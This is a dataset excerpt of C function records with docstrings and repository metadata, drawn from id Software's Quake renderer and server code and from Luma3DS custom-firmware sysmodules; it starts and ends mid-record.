(&r_reportedgeout);\n\tCvar_RegisterVariable (&r_maxedges);\n\tCvar_RegisterVariable (&r_numedges);\n\tCvar_RegisterVariable (&r_aliastransbase);\n\tCvar_RegisterVariable (&r_aliastransadj);\n\n\tCvar_SetValue (\"r_maxedges\", (float)NUMSTACKEDGES);\n\tCvar_SetValue (\"r_maxsurfs\", (float)NUMSTACKSURFACES);\n\n\tview_clipplanes[0].leftedge = true;\n\tview_clipplanes[1].rightedge = true;\n\tview_clipplanes[1].leftedge = view_clipplanes[2].leftedge =\n\t\t\tview_clipplanes[3].leftedge = false;\n\tview_clipplanes[0].rightedge = view_clipplanes[2].rightedge =\n\t\t\tview_clipplanes[3].rightedge = false;\n\n\tr_refdef.xOrigin = XCENTERING;\n\tr_refdef.yOrigin = YCENTERING;\n\n\tR_InitParticles ();\n\n// TODO: collect 386-specific code in one place\n#if\tid386\n\tSys_MakeCodeWriteable ((long)R_EdgeCodeStart,\n\t\t\t\t\t     (long)R_EdgeCodeEnd - (long)R_EdgeCodeStart);\n#endif\t// id386\n\n\tD_Init ();\n}", "path": "Quake/WinQuake/r_main.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake", "stars": 4494, "license": "None", "language": "c", "size": 2129}
{"docstring": "/*\n==================\nSV_BeginRedirect\n\n  Send Con_Printf data to the remote client\n  instead of the console\n==================\n*/\n", "func_signal": "void SV_BeginRedirect (redirect_t rd)", "code": "{\n\tsv_redirected = rd;\n\toutputbuf[0] = 0;\n}", "path": "Quake/QW/server/sv_send.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake", "stars": 4494, "license": "None", "language": "c", "size": 2129}
{"docstring": "/*\n=======================\nSV_UpdateClientStats\n\nPerforms a delta update of the stats array.  This should only be performed\nwhen a reliable message can be delivered this frame.\n=======================\n*/\n", "func_signal": "void SV_UpdateClientStats (client_t *client)", "code": "{\n\tedict_t\t*ent;\n\tint\t\tstats[MAX_CL_STATS];\n\tint\t\ti;\n\t\n\tent = client->edict;\n\tmemset (stats, 0, sizeof(stats));\n\t\n\t// if we are a spectator and we are tracking a player, we get his stats\n\t// so our status bar reflects his\n\tif (client->spectator && client->spec_track > 0)\n\t\tent = svs.clients[client->spec_track - 1].edict;\n\n\tstats[STAT_HEALTH] = ent->v.health;\n\tstats[STAT_WEAPON] = SV_ModelIndex(PR_GetString(ent->v.weaponmodel));\n\tstats[STAT_AMMO] = ent->v.currentammo;\n\tstats[STAT_ARMOR] = ent->v.armorvalue;\n\tstats[STAT_SHELLS] = ent->v.ammo_shells;\n\tstats[STAT_NAILS] = ent->v.ammo_nails;\n\tstats[STAT_ROCKETS] = ent->v.ammo_rockets;\n\tstats[STAT_CELLS] = ent->v.ammo_cells;\n\tif (!client->spectator)\n\t\tstats[STAT_ACTIVEWEAPON] = ent->v.weapon;\n\t// stuff the sigil bits into the high bits of items for sbar\n\tstats[STAT_ITEMS] = (int)ent->v.items | ((int)pr_global_struct->serverflags << 28);\n\n\tfor (i=0 ; i<MAX_CL_STATS ; i++)\n\t\tif (stats[i] != client->stats[i])\n\t\t{\n\t\t\tclient->stats[i] = stats[i];\n\t\t\tif (stats[i] >=0 && stats[i] <= 255)\n\t\t\t{\n\t\t\t\tClientReliableWrite_Begin(client, svc_updatestat, 3);\n\t\t\t\tClientReliableWrite_Byte(client, i);\n\t\t\t\tClientReliableWrite_Byte(client, stats[i]);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tClientReliableWrite_Begin(client, svc_updatestatlong, 6);\n\t\t\t\tClientReliableWrite_Byte(client, i);\n\t\t\t\tClientReliableWrite_Long(client, stats[i]);\n\t\t\t}\n\t\t}\n}", "path": "Quake/QW/server/sv_send.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake", "stars": 4494, "license": "None", "language": "c", "size": 2129}
{"docstring": "/*\n=============\nR_DrawViewModel\n=============\n*/\n", "func_signal": "void R_DrawViewModel (void)", "code": "{\n// FIXME: remove and do real lighting\n\tfloat\t\tlightvec[3] = {-1, 0, 0};\n\tint\t\t\tj;\n\tint\t\t\tlnum;\n\tvec3_t\t\tdist;\n\tfloat\t\tadd;\n\tdlight_t\t*dl;\n\t\n\tif (!r_drawviewmodel.value || r_fov_greater_than_90)\n\t\treturn;\n\n\tif (cl.items & IT_INVISIBILITY)\n\t\treturn;\n\n\tif (cl.stats[STAT_HEALTH] <= 0)\n\t\treturn;\n\n\tcurrententity = &cl.viewent;\n\tif (!currententity->model)\n\t\treturn;\n\n\tVectorCopy (currententity->origin, r_entorigin);\n\tVectorSubtract (r_origin, r_entorigin, modelorg);\n\n\tVectorCopy (vup, viewlightvec);\n\tVectorInverse (viewlightvec);\n\n\tj = R_LightPoint (currententity->origin);\n\n\tif (j < 24)\n\t\tj = 24;\t\t// allways give some light on gun\n\tr_viewlighting.ambientlight = j;\n\tr_viewlighting.shadelight = j;\n\n// add dynamic lights\t\t\n\tfor (lnum=0 ; lnum<MAX_DLIGHTS ; lnum++)\n\t{\n\t\tdl = &cl_dlights[lnum];\n\t\tif (!dl->radius)\n\t\t\tcontinue;\n\t\tif (!dl->radius)\n\t\t\tcontinue;\n\t\tif (dl->die < cl.time)\n\t\t\tcontinue;\n\n\t\tVectorSubtract (currententity->origin, dl->origin, dist);\n\t\tadd = dl->radius - Length(dist);\n\t\tif (add > 0)\n\t\t\tr_viewlighting.ambientlight += add;\n\t}\n\n// clamp lighting so it doesn't overbright as much\n\tif (r_viewlighting.ambientlight > 128)\n\t\tr_viewlighting.ambientlight = 128;\n\tif (r_viewlighting.ambientlight + r_viewlighting.shadelight > 192)\n\t\tr_viewlighting.shadelight = 192 - r_viewlighting.ambientlight;\n\n\tr_viewlighting.plightvec = lightvec;\n\n#ifdef QUAKE2\n\tcl.light_level = r_viewlighting.ambientlight;\n#endif\n\n\tR_AliasDrawModel (&r_viewlighting);\n}", "path": "Quake/WinQuake/r_main.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake", "stars": 4494, "license": "None", "language": "c", "size": 2129}
{"docstring": "/*\n===============\nR_ViewChanged\n\nCalled every time the vid structure or r_refdef changes.\nGuaranteed to be called before the first refresh\n===============\n*/\n", "func_signal": "void R_ViewChanged (vrect_t *pvrect, int lineadj, float aspect)", "code": "{\n\tint\t\ti;\n\tfloat\tres_scale;\n\n\tr_viewchanged = true;\n\n\tR_SetVrect (pvrect, &r_refdef.vrect, lineadj);\n\n\tr_refdef.horizontalFieldOfView = 2.0 * tan (r_refdef.fov_x/360*M_PI);\n\tr_refdef.fvrectx = (float)r_refdef.vrect.x;\n\tr_refdef.fvrectx_adj = (float)r_refdef.vrect.x - 0.5;\n\tr_refdef.vrect_x_adj_shift20 = (r_refdef.vrect.x<<20) + (1<<19) - 1;\n\tr_refdef.fvrecty = (float)r_refdef.vrect.y;\n\tr_refdef.fvrecty_adj = (float)r_refdef.vrect.y - 0.5;\n\tr_refdef.vrectright = r_refdef.vrect.x + r_refdef.vrect.width;\n\tr_refdef.vrectright_adj_shift20 = (r_refdef.vrectright<<20) + (1<<19) - 1;\n\tr_refdef.fvrectright = (float)r_refdef.vrectright;\n\tr_refdef.fvrectright_adj = (float)r_refdef.vrectright - 0.5;\n\tr_refdef.vrectrightedge = (float)r_refdef.vrectright - 0.99;\n\tr_refdef.vrectbottom = r_refdef.vrect.y + r_refdef.vrect.height;\n\tr_refdef.fvrectbottom = (float)r_refdef.vrectbottom;\n\tr_refdef.fvrectbottom_adj = (float)r_refdef.vrectbottom - 0.5;\n\n\tr_refdef.aliasvrect.x = (int)(r_refdef.vrect.x * r_aliasuvscale);\n\tr_refdef.aliasvrect.y = (int)(r_refdef.vrect.y * r_aliasuvscale);\n\tr_refdef.aliasvrect.width = (int)(r_refdef.vrect.width * r_aliasuvscale);\n\tr_refdef.aliasvrect.height = (int)(r_refdef.vrect.height * r_aliasuvscale);\n\tr_refdef.aliasvrectright = r_refdef.aliasvrect.x +\n\t\t\tr_refdef.aliasvrect.width;\n\tr_refdef.aliasvrectbottom = r_refdef.aliasvrect.y +\n\t\t\tr_refdef.aliasvrect.height;\n\n\tpixelAspect = aspect;\n\txOrigin = r_refdef.xOrigin;\n\tyOrigin = r_refdef.yOrigin;\n\t\n\tscreenAspect = r_refdef.vrect.width*pixelAspect /\n\t\t\tr_refdef.vrect.height;\n// 320*200 1.0 pixelAspect = 1.6 screenAspect\n// 320*240 1.0 pixelAspect = 1.3333 screenAspect\n// proper 320*200 pixelAspect = 0.8333333\n\n\tverticalFieldOfView = r_refdef.horizontalFieldOfView / screenAspect;\n\n// values for perspective projection\n// if math were exact, the values would range from 0.5 to to range+0.5\n// hopefully they wll be in the 0.000001 to range+.999999 and truncate\n// the polygon rasterization will never render in the first row or column\n// but will definately render in the [range] row and column, so adjust the\n// buffer origin to get an exact edge to edge fill\n\txcenter = ((float)r_refdef.vrect.width * XCENTERING) +\n\t\t\tr_refdef.vrect.x - 0.5;\n\taliasxcenter = xcenter * r_aliasuvscale;\n\tycenter = ((float)r_refdef.vrect.height * YCENTERING) +\n\t\t\tr_refdef.vrect.y - 0.5;\n\taliasycenter = ycenter * r_aliasuvscale;\n\n\txscale = r_refdef.vrect.width / r_refdef.horizontalFieldOfView;\n\taliasxscale = xscale * r_aliasuvscale;\n\txscaleinv = 1.0 / xscale;\n\tyscale = xscale * pixelAspect;\n\taliasyscale = yscale * r_aliasuvscale;\n\tyscaleinv = 1.0 / yscale;\n\txscaleshrink = (r_refdef.vrect.width-6)/r_refdef.horizontalFieldOfView;\n\tyscaleshrink = xscaleshrink*pixelAspect;\n\n// left side clip\n\tscreenedge[0].normal[0] = -1.0 / (xOrigin*r_refdef.horizontalFieldOfView);\n\tscreenedge[0].normal[1] = 0;\n\tscreenedge[0].normal[2] = 1;\n\tscreenedge[0].type = PLANE_ANYZ;\n\t\n// right side clip\n\tscreenedge[1].normal[0] =\n\t\t\t1.0 / ((1.0-xOrigin)*r_refdef.horizontalFieldOfView);\n\tscreenedge[1].normal[1] = 0;\n\tscreenedge[1].normal[2] = 1;\n\tscreenedge[1].type = PLANE_ANYZ;\n\t\n// top side clip\n\tscreenedge[2].normal[0] = 0;\n\tscreenedge[2].normal[1] = -1.0 / (yOrigin*verticalFieldOfView);\n\tscreenedge[2].normal[2] = 1;\n\tscreenedge[2].type = PLANE_ANYZ;\n\t\n// bottom side clip\n\tscreenedge[3].normal[0] = 0;\n\tscreenedge[3].normal[1] = 1.0 / ((1.0-yOrigin)*verticalFieldOfView);\n\tscreenedge[3].normal[2] = 1;\t\n\tscreenedge[3].type = PLANE_ANYZ;\n\t\n\tfor (i=0 ; i<4 ; i++)\n\t\tVectorNormalize (screenedge[i].normal);\n\n\tres_scale = sqrt ((double)(r_refdef.vrect.width * r_refdef.vrect.height) /\n\t\t\t          (320.0 * 152.0)) *\n\t\t\t(2.0 / r_refdef.horizontalFieldOfView);\n\tr_aliastransition = r_aliastransbase.value * res_scale;\n\tr_resfudge = r_aliastransadj.value * res_scale;\n\n\tif (scr_fov.value <= 90.0)\n\t\tr_fov_greater_than_90 = false;\n\telse\n\t\tr_fov_greater_than_90 = true;\n\n// TODO: collect 386-specific code in one place\n#if\tid386\n\tif (r_pixbytes == 1)\n\t{\n\t\tSys_MakeCodeWriteable ((long)R_Surf8Start,\n\t\t\t\t\t\t     (long)R_Surf8End - (long)R_Surf8Start);\n\t\tcolormap = vid.colormap;\n\t\tR_Surf8Patch ();\n\t}\n\telse\n\t{\n\t\tSys_MakeCodeWriteable ((long)R_Surf16Start,\n\t\t\t\t\t\t     (long)R_Surf16End - (long)R_Surf16Start);\n\t\tcolormap = vid.colormap16;\n\t\tR_Surf16Patch ();\n\t}\n#endif\t// id386\n\n\tD_ViewChanged ();\n}", "path": "Quake/WinQuake/r_main.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake", "stars": 4494, "license": "None", "language": "c", "size": 2129}
{"docstring": "/*\n===============\nR_SetVrect\n===============\n*/\n", "func_signal": "void R_SetVrect (vrect_t *pvrectin, vrect_t *pvrect, int lineadj)", "code": "{\n\tint\t\th;\n\tfloat\tsize;\n\n\tsize = scr_viewsize.value > 100 ? 100 : scr_viewsize.value;\n\tif (cl.intermission)\n\t{\n\t\tsize = 100;\n\t\tlineadj = 0;\n\t}\n\tsize /= 100;\n\n\th = pvrectin->height - lineadj;\n\tpvrect->width = pvrectin->width * size;\n\tif (pvrect->width < 96)\n\t{\n\t\tsize = 96.0 / pvrectin->width;\n\t\tpvrect->width = 96;\t// min for icons\n\t}\n\tpvrect->width &= ~7;\n\tpvrect->height = pvrectin->height * size;\n\tif (pvrect->height > pvrectin->height - lineadj)\n\t\tpvrect->height = pvrectin->height - lineadj;\n\n\tpvrect->height &= ~1;\n\n\tpvrect->x = (pvrectin->width - pvrect->width)/2;\n\tpvrect->y = (h - pvrect->height)/2;\n\n\t{\n\t\tif (lcd_x.value)\n\t\t{\n\t\t\tpvrect->y >>= 1;\n\t\t\tpvrect->height >>= 1;\n\t\t}\n\t}\n}", "path": "Quake/WinQuake/r_main.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake", "stars": 4494, "license": "None", "language": "c", "size": 2129}
{"docstring": "/*\n=============\nR_DrawBEntitiesOnList\n=============\n*/\n", "func_signal": "void R_DrawBEntitiesOnList (void)", "code": "{\n\tint\t\t\ti, j, k, clipflags;\n\tvec3_t\t\toldorigin;\n\tmodel_t\t\t*clmodel;\n\tfloat\t\tminmaxs[6];\n\n\tif (!r_drawentities.value)\n\t\treturn;\n\n\tVectorCopy (modelorg, oldorigin);\n\tinsubmodel = true;\n\tr_dlightframecount = r_framecount;\n\n\tfor (i=0 ; i<cl_numvisedicts ; i++)\n\t{\n\t\tcurrententity = cl_visedicts[i];\n\n\t\tswitch (currententity->model->type)\n\t\t{\n\t\tcase mod_brush:\n\n\t\t\tclmodel = currententity->model;\n\n\t\t// see if the bounding box lets us trivially reject, also sets\n\t\t// trivial accept status\n\t\t\tfor (j=0 ; j<3 ; j++)\n\t\t\t{\n\t\t\t\tminmaxs[j] = currententity->origin[j] +\n\t\t\t\t\t\tclmodel->mins[j];\n\t\t\t\tminmaxs[3+j] = currententity->origin[j] +\n\t\t\t\t\t\tclmodel->maxs[j];\n\t\t\t}\n\n\t\t\tclipflags = R_BmodelCheckBBox (clmodel, minmaxs);\n\n\t\t\tif (clipflags != BMODEL_FULLY_CLIPPED)\n\t\t\t{\n\t\t\t\tVectorCopy (currententity->origin, r_entorigin);\n\t\t\t\tVectorSubtract (r_origin, r_entorigin, modelorg);\n\t\t\t// FIXME: is this needed?\n\t\t\t\tVectorCopy (modelorg, r_worldmodelorg);\n\t\t\n\t\t\t\tr_pcurrentvertbase = clmodel->vertexes;\n\t\t\n\t\t\t// FIXME: stop transforming twice\n\t\t\t\tR_RotateBmodel ();\n\n\t\t\t// calculate dynamic lighting for bmodel if it's not an\n\t\t\t// instanced model\n\t\t\t\tif (clmodel->firstmodelsurface != 0)\n\t\t\t\t{\n\t\t\t\t\tfor (k=0 ; k<MAX_DLIGHTS ; k++)\n\t\t\t\t\t{\n\t\t\t\t\t\tif ((cl_dlights[k].die < cl.time) ||\n\t\t\t\t\t\t\t(!cl_dlights[k].radius))\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tcontinue;\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\tR_MarkLights (&cl_dlights[k], 1<<k,\n\t\t\t\t\t\t\tclmodel->nodes + clmodel->hulls[0].firstclipnode);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t// if the driver wants polygons, deliver those. Z-buffering is on\n\t\t\t// at this point, so no clipping to the world tree is needed, just\n\t\t\t// frustum clipping\n\t\t\t\tif (r_drawpolys | r_drawculledpolys)\n\t\t\t\t{\n\t\t\t\t\tR_ZDrawSubmodelPolys (clmodel);\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tr_pefragtopnode = NULL;\n\n\t\t\t\t\tfor (j=0 ; j<3 ; j++)\n\t\t\t\t\t{\n\t\t\t\t\t\tr_emins[j] = minmaxs[j];\n\t\t\t\t\t\tr_emaxs[j] = minmaxs[3+j];\n\t\t\t\t\t}\n\n\t\t\t\t\tR_SplitEntityOnNode2 (cl.worldmodel->nodes);\n\n\t\t\t\t\tif (r_pefragtopnode)\n\t\t\t\t\t{\n\t\t\t\t\t\tcurrententity->topnode = r_pefragtopnode;\n\t\n\t\t\t\t\t\tif (r_pefragtopnode->contents >= 0)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t// not a leaf; has to be clipped to the world BSP\n\t\t\t\t\t\t\tr_clipflags = clipflags;\n\t\t\t\t\t\t\tR_DrawSolidClippedSubmodelPolygons (clmodel);\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse\n\t\t\t\t\t\t{\n\t\t\t\t\t\t// falls entirely in one leaf, so we just put all the\n\t\t\t\t\t\t// edges in the edge list and let 1/z sorting handle\n\t\t\t\t\t\t// drawing order\n\t\t\t\t\t\t\tR_DrawSubmodelPolygons (clmodel, clipflags);\n\t\t\t\t\t\t}\n\t\n\t\t\t\t\t\tcurrententity->topnode = NULL;\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t// put back world rotation and frustum clipping\t\t\n\t\t\t// FIXME: R_RotateBmodel should just work off base_vxx\n\t\t\t\tVectorCopy (base_vpn, vpn);\n\t\t\t\tVectorCopy (base_vup, vup);\n\t\t\t\tVectorCopy (base_vright, vright);\n\t\t\t\tVectorCopy (base_modelorg, modelorg);\n\t\t\t\tVectorCopy (oldorigin, modelorg);\n\t\t\t\tR_TransformFrustum ();\n\t\t\t}\n\n\t\t\tbreak;\n\n\t\tdefault:\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tinsubmodel = false;\n}", "path": "Quake/WinQuake/r_main.c", "commit_date": "2012-01-31 00:00:00", "repo_name": "id-Software/Quake", "stars": 4494, "license": "None", "language": "c", "size": 2129}
{"docstring": "// this is called before main\n", "func_signal": "void initSystem(void)", "code": "{\n    s64 out;\n    Result res;\n    __sync_init();\n    mappableInit(0x10000000, 0x14000000);\n\n    isN3DS = svcGetSystemInfo(&out, 0x10001, 0) == 0;\n\n    svcGetSystemInfo(&out, 0x10000, 0x100);\n    Luma_SharedConfig->hbldr_3dsx_tid = out == 0 ? HBLDR_DEFAULT_3DSX_TID : (u64)out;\n    Luma_SharedConfig->use_hbldr = true;\n\n    svcGetSystemInfo(&out, 0x10000, 0x101);\n    menuCombo = out == 0 ? DEFAULT_MENU_COMBO : (u32)out;\n\n    miscellaneousMenu.items[0].title = Luma_SharedConfig->hbldr_3dsx_tid == HBLDR_DEFAULT_3DSX_TID ?\n        \"Switch the hb. title to the current app.\" :\n        \"Switch the hb. title to hblauncher_loader\";\n\n    for(res = 0xD88007FA; res == (Result)0xD88007FA; svcSleepThread(500 * 1000LL))\n    {\n        res = srvInit();\n        if(R_FAILED(res) && res != (Result)0xD88007FA)\n            svcBreak(USERBREAK_PANIC);\n    }\n\n    if (R_FAILED(pmAppInit()) || R_FAILED(pmDbgInit()))\n        svcBreak(USERBREAK_PANIC);\n\n    if (R_FAILED(fsInit()))\n        svcBreak(USERBREAK_PANIC);\n\n    if (R_FAILED(FSUSER_SetPriority(-16)))\n        svcBreak(USERBREAK_PANIC);\n\n    // **** DO NOT init services that don't come from KIPs here ****\n    // Instead, init the service only where it's actually init (then deinit it).\n\n    __libc_init_array();\n\n    // ROSALINA HACKJOB END\n\n    // Rosalina specific:\n    u32 *tls = (u32 *)getThreadLocalStorage();\n    memset(tls, 0, 0x80);\n    tls[0] = 0x21545624;\n\n    // ROSALINA HACKJOB BEGIN\n    // NORMAL APPS SHOULD NOT DO THIS, EVER\n    srvSetBlockingPolicy(true); // GetServiceHandle nonblocking if service port is full\n}", "path": "Luma3DS/sysmodules/rosalina/source/main.c", "commit_date": "2020-07-16 00:00:00", "repo_name": "LumaTeam/Luma3DS", "stars": 4771, "license": "gpl-3.0", "language": "c", "size": 8839}
{"docstring": "// called before main\n", "func_signal": "void initSystem(void)", "code": "{\n    __sync_init();\n    loadCFWInfo();\n\n    Result res;\n    for(res = 0xD88007FA; res == (Result)0xD88007FA; svcSleepThread(500 * 1000LL))\n    {\n        res = srvInit();\n        if(R_FAILED(res) && res != (Result)0xD88007FA)\n            panic(res);\n    }\n\n    assertSuccess(fsRegInit());\n    assertSuccess(fsldrPatchPermissions());\n\n    //fsldrInit();\n    assertSuccess(srvGetServiceHandle(fsGetSessionHandle(), \"fs:LDR\"));\n\n    // Hackjob\n    assertSuccess(FSUSER_InitializeWithSdkVersion(*fsGetSessionHandle(), 0x70200C8));\n    assertSuccess(FSUSER_SetPriority(0));\n\n    assertSuccess(pxiPmInit());\n\n    //__libc_init_array();\n}", "path": "Luma3DS/sysmodules/loader/source/main.c", "commit_date": "2020-04-28 00:00:00", "repo_name": "LumaTeam/Luma3DS", "stars": 4771, "license": "gpl-3.0", "language": "c", "size": 8839}
{"docstring": "// Note: official PM doesn't include svcDebugActiveProcess in this function, but rather in the caller handling dependencies\n", "func_signal": "static Result loadWithoutDependencies(Handle *outDebug, ProcessData **outProcessData, u64 programHandle, const FS_ProgramInfo *programInfo,\n    u32 launchFlags, const ExHeader_Info *exheaderInfo)", "code": "{\n    Result res = 0;\n    Handle processHandle = 0;\n    u32 pid;\n    ProcessData *process;\n    const ExHeader_Arm11SystemLocalCapabilities *localcaps = &exheaderInfo->aci.local_caps;\n\n    if (outDebug != NULL) {\n        *outDebug = 0;\n    }\n\n    if (outProcessData != NULL) {\n        *outProcessData = NULL;\n    }\n\n    if (programInfo->programId & (1ULL << 35)) {\n        // RequireBatchUpdate?\n        return 0xD8E05803;\n    }\n\n    TRY(LOADER_LoadProcess(&processHandle, programHandle));\n    TRY(svcGetProcessId(&pid, processHandle));\n\n    // Note: bug in official PM: it seems not to panic/cleanup properly if the function calls below fail,\n    // svcTerminateProcess won't be called, it's possible to trigger NULL derefs if you crash fs/sm/whatever,\n    // leaks dependencies, and so on...\n    // This can be solved by interesting the new process in the list earlier, etc. etc., allowing us to simplify the logic greatly.\n\n    ProcessList_Lock(&g_manager.processList);\n    process = ProcessList_New(&g_manager.processList);\n    if (process == NULL) {\n        panic(1);\n    }\n\n    process->handle = processHandle;\n    process->pid = pid;\n    process->titleId = exheaderInfo->aci.local_caps.title_id;;\n    process->programHandle = programHandle;\n    process->launchFlags = launchFlags; // not in official PM\n    process->flags = 0; // will be filled later\n    process->terminatedNotificationVariation = (launchFlags & 0xF0) >> 4;\n    process->terminationStatus = TERMSTATUS_RUNNING;\n    process->refcount = 1;\n    process->mediaType = programInfo->mediaType; // not in official PM\n\n    ProcessList_Unlock(&g_manager.processList);\n    svcSignalEvent(g_manager.newProcessEvent);\n\n    if (outProcessData != NULL) {\n        *outProcessData = process;\n    }\n\n    u32 serviceCount;\n    for(serviceCount = 0; serviceCount < 34 && *(u64 *)localcaps->service_access[serviceCount] != 0; serviceCount++);\n\n    // Not in official PM: patch local caps to give access to everything\n    ExHeader_Arm11StorageInfo storageInfo = localcaps->storage_info;\n    storageInfo.fs_access_info = 0xFFFFFFFF;\n\n    TRY(FSREG_Register(pid, programHandle, programInfo, &storageInfo));\n    TRY(SRVPM_RegisterProcess(pid, serviceCount, localcaps->service_access));\n\n    if (localcaps->reslimit_category <= RESLIMIT_CATEGORY_OTHER) {\n        TRY(svcSetProcessResourceLimits(processHandle, g_manager.reslimits[localcaps->reslimit_category]));\n    }\n\n    // Yes, even numberOfCores=2 on N3DS. On the 3DS, the affinity mask doesn't play the role of an access limiter,\n    // it's only useful for cpuId < 0. thread->affinityMask = process->affinityMask | (cpuId >= 0 ? 1 << cpuId : 0)\n    u8 affinityMask = localcaps->core_info.affinity_mask;\n    TRY(svcSetProcessAffinityMask(processHandle, &affinityMask, 2));\n    TRY(svcSetProcessIdealProcessor(processHandle, localcaps->core_info.ideal_processor));\n\n    if (launchFlags & PMLAUNCHFLAG_NORMAL_APPLICATION) {\n        setAppCpuTimeLimitAndSchedModeFromDescriptor(localcaps->title_id, localcaps->reslimits[0]);\n        (*outProcessData)->flags |= PROCESSFLAG_NORMAL_APPLICATION; // not in official PM\n    }\n\n    if (outDebug != NULL) {\n        TRY(svcDebugActiveProcess(outDebug, pid));\n    }\n\n    return res;\n}", "path": "Luma3DS/sysmodules/pm/source/launch.c", "commit_date": "2020-07-12 00:00:00", "repo_name": "LumaTeam/Luma3DS", "stars": 4771, "license": "gpl-3.0", "language": "c", "size": 8839}
{"docstring": "/* Test if the character is DBC 1st byte */\n", "func_signal": "static int dbc_1st (BYTE c)", "code": "{\n#if FF_CODE_PAGE == 0\t\t/* Variable code page */\n\tif (DbcTbl && c >= DbcTbl[0]) {\n\t\tif (c <= DbcTbl[1]) return 1;\t\t\t\t\t/* 1st byte range 1 */\n\t\tif (c >= DbcTbl[2] && c <= DbcTbl[3]) return 1;\t/* 1st byte range 2 */\n\t}\n#elif FF_CODE_PAGE >= 900\t/* DBCS fixed code page */\n\tif (c >= DbcTbl[0]) {\n\t\tif (c <= DbcTbl[1]) return 1;\n\t\tif (c >= DbcTbl[2] && c <= DbcTbl[3]) return 1;\n\t}\n#else\t\t\t\t\t\t/* SBCS fixed code page */\n\tif (c != 0) return 0;\t/* Always false */\n#endif\n\treturn 0;\n}", "path": "Luma3DS/arm9/source/fatfs/ff.c", "commit_date": "2019-03-15 00:00:00", "repo_name": "LumaTeam/Luma3DS", "stars": 4771, "license": "gpl-3.0", "language": "c", "size": 8839}
{"docstring": "// soc's poll function is odd, and doesn't like -1 as fd.\n// so this compacts everything together\n", "func_signal": "static void compact(struct sock_server *serv)", "code": "{\n    int new_fds[MAX_CTXS];\n    struct sock_ctx *new_ctxs[MAX_CTXS];\n    nfds_t n = 0;\n\n    for(nfds_t i = 0; i < serv->nfds; i++)\n    {\n        if(serv->poll_fds[i].fd != -1)\n        {\n            new_fds[n] = serv->poll_fds[i].fd;\n            new_ctxs[n] = serv->ctx_ptrs[i];\n            n++;\n        }\n    }\n\n    for(nfds_t i = 0; i < n; i++)\n    {\n        serv->poll_fds[i].fd = new_fds[i];\n        serv->ctx_ptrs[i] = new_ctxs[i];\n        serv->ctx_ptrs[i]->i = i;\n    }\n    serv->nfds = n;\n    serv->compact_needed = false;\n}", "path": "Luma3DS/sysmodules/rosalina/source/sock_util.c", "commit_date": "2020-05-15 00:00:00", "repo_name": "LumaTeam/Luma3DS", "stars": 4771, "license": "gpl-3.0", "language": "c", "size": 8839}
{"docstring": "// Note: official PM has two distinct functions for sysmodule vs. regular app. We refactor that into a single function.\n", "func_signal": "static Result launchTitleImpl(Handle *debug, ProcessData **outProcessData, const FS_ProgramInfo *programInfo,\n    const FS_ProgramInfo *programInfoUpdate, u32 launchFlags, ExHeader_Info *exheaderInfo)", "code": "{\n    *outProcessData = NULL;\n\n    if (debug != NULL) {\n        *debug = 0;\n    }\n\n    if (isTitleLaunchPrevented(programInfo->programId)) {\n        return 0;\n    }\n\n    if (launchFlags & PMLAUNCHFLAG_NORMAL_APPLICATION) {\n        launchFlags |= PMLAUNCHFLAG_LOAD_DEPENDENCIES;\n    } else {\n        // NEW: allow non-apps to be debugged with the help of pm\n        //launchFlags &= ~(PMLAUNCHFLAG_USE_UPDATE_TITLE | PMLAUNCHFLAG_QUEUE_DEBUG_APPLICATION);\n        launchFlags &= ~PMLAUNCHFLAG_USE_UPDATE_TITLE;\n        launchFlags &= ~(PMLAUNCHFLAG_FORCE_USE_O3DS_APP_MEM | PMLAUNCHFLAG_FORCE_USE_O3DS_MAX_APP_MEM);\n    }\n\n    Result res = 0;\n    u64 programHandle;\n    StartupInfo si = {0};\n\n    programInfoUpdate = (launchFlags & PMLAUNCHFLAG_USE_UPDATE_TITLE) ? programInfoUpdate : programInfo;\n    TRY(registerProgram(&programHandle, programInfo, programInfoUpdate));\n\n    u32 coreVer = OS_KernelConfig->kernel_syscore_ver;\n    res = LOADER_GetProgramInfo(exheaderInfo, programHandle);\n    res = R_SUCCEEDED(res) && coreVer == 2 && exheaderInfo->aci.local_caps.core_info.core_version != coreVer ? (Result)0xC8A05800 : res;\n\n    if (R_FAILED(res)) {\n        LOADER_UnregisterProgram(programHandle);\n        return res;\n    }\n\n    // Change APPMEMALLOC if needed\n    if (IS_N3DS && OS_KernelConfig->app_memtype == 6 && (launchFlags & PMLAUNCHFLAG_NORMAL_APPLICATION) != 0) {\n        u32 limitMb;\n        SystemMode n3dsSystemMode = exheaderInfo->aci.local_caps.core_info.n3ds_system_mode;\n        bool forceO3dsAppMem = (launchFlags & PMLAUNCHFLAG_FORCE_USE_O3DS_APP_MEM) != 0;\n        if (forceO3dsAppMem && (launchFlags & PMLAUNCHFLAG_FORCE_USE_O3DS_MAX_APP_MEM) != 0) {\n            setAppMemLimit(96 << 20);\n        } else if (forceO3dsAppMem || n3dsSystemMode == SYSMODE_O3DS_PROD) {\n            switch (exheaderInfo->aci.local_caps.core_info.o3ds_system_mode) {\n                case SYSMODE_O3DS_PROD: limitMb = 64; break;\n                case SYSMODE_DEV1:      limitMb = 96; break;\n                case SYSMODE_DEV2:      limitMb = 80; break;\n                default:                limitMb = 0;  break;\n            }\n\n            // Can be 0:\n            setAppMemLimit(limitMb << 20);\n        }\n    }\n\n    if (launchFlags & PMLAUNCHFLAG_LOAD_DEPENDENCIES) {\n        TRYG(loadWithDependencies(debug, outProcessData, programHandle, programInfo, launchFlags, exheaderInfo), cleanup);\n        // note: official pm doesn't terminate the process if this fails (dependency loading)...\n        // This may be intentional, but I believe this is a bug since the 0xD8A05805 and svcRun failure codepaths terminate the process...\n        // It also forgets to clear 